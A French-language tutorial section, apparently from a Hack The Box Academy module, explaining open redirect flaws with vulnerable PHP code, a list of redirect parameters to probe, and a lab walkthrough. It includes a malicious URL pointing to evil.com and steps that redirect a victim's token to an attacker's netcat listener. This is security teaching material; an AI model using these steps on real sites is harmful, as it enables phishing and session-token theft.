Ouvrir la redirection
=====================

* * * * *

Une vulnérabilité de redirection ouverte se produit lorsqu'un attaquant peut rediriger une victime vers un site contrôlé par un attaquant en abusant de la fonctionnalité de redirection d'une application légitime. Dans de tels cas, tout ce que l'attaquant a à faire est de spécifier un site Web sous son contrôle dans une URL de redirection d'un site Web légitime et de transmettre cette URL à la victime. Comme vous pouvez l'imaginer, cela est possible lorsque la fonctionnalité de redirection de l'application légitime n'effectue aucune sorte de validation concernant les sites Web vers lesquels la redirection pointe. Du point de vue d'un attaquant, une vulnérabilité de redirection ouverte peut s'avérer extrêmement utile lors de la phase d'accès initiale, car elle peut conduire les victimes vers des pages Web contrôlées par l'attaquant via une page en laquelle ils ont confiance.

Jetons un coup d'œil à un code.

Code : php

```
$red = $_GET['url'];
header("Location: " . $red);

```

Code : php

```
$red = $_GET['url'];

```

Dans la ligne de code ci-dessus, une variable appelée *red* est définie et obtient sa valeur à partir d'un paramètre appelé *url* . *$_GET* est une super variable PHP qui nous permet d'accéder à la valeur du paramètre *url* .

Code : php

```
header("Location: " . $red);

```

L'en-tête de réponse Location indique l'URL vers laquelle rediriger une page. La ligne de code ci-dessus définit l'emplacement sur la valeur de *red* , sans aucune validation. Nous sommes ici confrontés à une vulnérabilité Open Redirect.

L'URL malveillante qu'un attaquant enverrait en exploitant la vulnérabilité Open Redirect ressemblerait à ceci :`trusted.site/index.php?url=https://evil.com`

Assurez-vous de vérifier les paramètres d'URL suivants lors de la recherche de bogues, vous les verrez souvent dans les pages de connexion. Exemple:`/login.php?redirect=dashboard`

-   ?URL=
-   ?lien=
-   ?redirect=
-   ?URL de redirection=
-   ?redirect_uri=
-   ?retour=
-   ?return_to=
-   ?URL_retour=
-   ?go=
-   ?goto=
-   ?exit=
-   ?exitpage=
-   ?fromurl=
-   ?fromuri=
-   ?redirect_to=
-   ?suivant=
-   ?nouvelleURL=
-   ?redir=

* * * * *

Exemple de redirection ouverte
------------------------------

Allez à la fin de cette section et cliquez sur `Click here to spawn the target system!`ou sur l' `Reset Target`icône . Utilisez la Pwnbox fournie ou une machine virtuelle locale avec la clé VPN fournie pour atteindre l'application cible et suivez-la. N'oubliez pas de configurer le vhost ( `oredirect.htb.net`) spécifié pour accéder à l'application.

Accédez à `oredirect.htb.net`. Vous tomberez sur une URL au format ci-dessous :

`http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN ASSIGNED BY THE APP>`

Si vous saisissez un compte de messagerie, vous remarquerez que l'application finit par envoyer une requête POST à ​​la page spécifiée dans le paramètre *redirect_uri* . Un *jeton* est également inclus dans la requête POST. Ce jeton pourrait être un jeton de session ou anti-CSRF et, par conséquent, utile à un attaquant.

![image](https://academy.hackthebox.com/storage/modules/153/72.png)

Testons si nous pouvons contrôler le site vers lequel pointe le paramètre *redirect_uri . *En d'autres termes, vérifions si l'application effectue la redirection sans aucune sorte de validation (Open Redirect).

Nous pouvons tester cela comme suit.

Tout d'abord, configurons un écouteur Netcat.

```
dsgsec@htb[/htb]$ nc -lvnp 1337

```

Copiez l'intégralité de l'URL où vous avez atterri après avoir navigué vers `oredirect.htb.net`. Il doit s'agir d'une URL au format ci-dessous :

`http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN ASSIGNED BY THE APP>`

Modifiez ensuite cette URL comme suit.

`http://oredirect.htb.net/?redirect_uri=http://<VPN/TUN Adapter IP>:PORT&token=<RANDOM TOKEN ASSIGNED BY THE APP>`

`<RANDOM TOKEN ASSIGNED BY THE APP>`<-- Remplacez-le par le jeton attribué automatiquement par l'application.

Ouvrez un `New Private Window`et accédez au lien ci-dessus pour simuler la victime.

Lorsque la victime saisit son e-mail, nous remarquons qu'une connexion est établie avec notre auditeur. L'application est en effet vulnérable à Open Redirect. Non seulement cela, mais la demande capturée capturée inclut également le jeton !

![image](https://academy.hackthebox.com/storage/modules/153/71.png)

Les vulnérabilités de redirection ouvertes sont généralement exploitées par les attaquants pour créer des URL de phishing d'apparence légitime. Comme nous venons de le voir, cependant, lorsqu'une fonctionnalité de redirection implique des jetons utilisateur (indépendamment de l'utilisation de GET ou POST), les attaquants peuvent également exploiter les vulnérabilités de redirection ouvertes pour obtenir des jetons utilisateur.

La section suivante fournira quelques conseils de prévention liés aux vulnérabilités couvertes.
